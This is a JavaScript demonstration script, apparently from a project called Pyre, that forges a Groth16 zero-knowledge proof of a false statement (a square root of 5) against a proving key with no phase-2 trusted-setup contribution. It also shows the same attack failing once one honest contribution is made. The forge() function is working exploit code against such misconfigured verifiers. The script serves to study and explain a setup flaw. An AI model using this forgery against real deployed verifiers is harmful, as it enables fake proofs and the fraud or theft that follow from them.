// Forgery demonstration for Pyre (run 2026-11-24 with snarkjs 0.7.5).
//
// Circuit: "I know a square root of the public value y" (sqrt.circom).
// The claim y = 5 is FALSE: 5 is a quadratic non-residue in the BN254 scalar
// field, so no witness exists and an honest prover cannot make a proof.
//
// Case A: a key with NO phase-2 contribution (delta = gamma = G2 generator).
//         This is the setup mistake behind the first two live Groth16 exploits.
// Case B: the same circuit after one honest phase-2 contribution whose secret
//         was thrown away. The same attack is tried and must fail.
//
// The forgery: A = alpha, B = beta + b*G2, C = delta^-1 * (b*alpha - IC(x)).
// It needs the delta scalar. In case A delta = 1, so anyone can do it; a single
// person who ran phase 2 and kept their secret is in exactly the same position.
import * as snarkjs from "snarkjs";
import { getCurveFromName, utils, Scalar } from "ffjavascript";
import { randomBytes } from "crypto";
import { writeFileSync } from "fs";

const { unstringifyBigInts, stringifyBigInts } = utils;
const log = (...a) => console.log(...a);
const rnd = () => randomBytes(32).toString("hex");

const curve = await getCurveFromName("bn128");
const { G1, G2, Fr } = curve;

// ---- phase 1 (local, one random contribution; not the subject of the demo)
await snarkjs.powersOfTau.newAccumulator(curve, 4, "pot0.ptau");
await snarkjs.powersOfTau.contribute("pot0.ptau", "pot1.ptau", "phase1", rnd());
await snarkjs.powersOfTau.preparePhase2("pot1.ptau", "pot.ptau");

// ---- case A: no phase-2 contribution; case B: one honest contribution
await snarkjs.zKey.newZKey("sqrt.r1cs", "pot.ptau", "keyA.zkey");
await snarkjs.zKey.contribute("keyA.zkey", "keyB.zkey", "honest contributor", rnd());
const vkA = await snarkjs.zKey.exportVerificationKey("keyA.zkey");
const vkB = await snarkjs.zKey.exportVerificationKey("keyB.zkey");

const eqG2 = (p, q) => JSON.stringify(p) === JSON.stringify(q);
log("key A: delta_2 == gamma_2 ?", eqG2(vkA.vk_delta_2, vkA.vk_gamma_2));
log("key B: delta_2 == gamma_2 ?", eqG2(vkB.vk_delta_2, vkB.vk_gamma_2));

// sanity: an honest proof of a TRUE statement (3^2 = 9) verifies with key B
const honest = await snarkjs.groth16.fullProve({ a: 3 }, "sqrt_js/sqrt.wasm", "keyB.zkey");
log("honest proof, y = 9, key B:", await snarkjs.groth16.verify(vkB, honest.publicSignals, honest.proof));

// sanity: no witness exists for y = 5 (5 is a non-residue: 5^((r-1)/2) = -1)
const five = Fr.e(5);
log("5 is a non-residue in Fr:", Fr.eq(Fr.exp(five, Scalar.shr(Scalar.sub(Fr.p, 1), 1)), Fr.negone));

function forge(vk, publicY, deltaScalar) {
  const v = unstringifyBigInts(vk);
  const alpha = G1.fromObject(v.vk_alpha_1);
  const beta = G2.fromObject(v.vk_beta_2);
  const ic0 = G1.fromObject(v.IC[0]);
  const ic1 = G1.fromObject(v.IC[1]);
  const b = Fr.e(123456789n);
  const icx = G1.add(ic0, G1.timesFr(ic1, Fr.e(publicY)));
  const A = alpha;
  const B = G2.add(beta, G2.timesFr(G2.g, b));
  const C = G1.timesFr(G1.sub(G1.timesFr(alpha, b), icx), Fr.inv(deltaScalar));
  return stringifyBigInts({
    pi_a: G1.toObject(G1.toAffine(A)),
    pi_b: G2.toObject(G2.toAffine(B)),
    pi_c: G1.toObject(G1.toAffine(C)),
    protocol: "groth16",
    curve: "bn128",
  });
}

// The attacker uses delta = 1. That is the true value for key A only.
const fA = forge(vkA, 5n, Fr.one);
const fB = forge(vkB, 5n, Fr.one);
const okA = await snarkjs.groth16.verify(vkA, ["5"], fA);
const okB = await snarkjs.groth16.verify(vkB, ["5"], fB);
log("FORGED proof of a false statement (y = 5), key A (no phase 2):", okA);
log("same forgery, key B (one honest contribution):", okB);

writeFileSync("result.json", JSON.stringify({ forged_proof_key_A: fA, public: ["5"], verifies_key_A: okA, verifies_key_B: okB }, null, 1));
await curve.terminate();
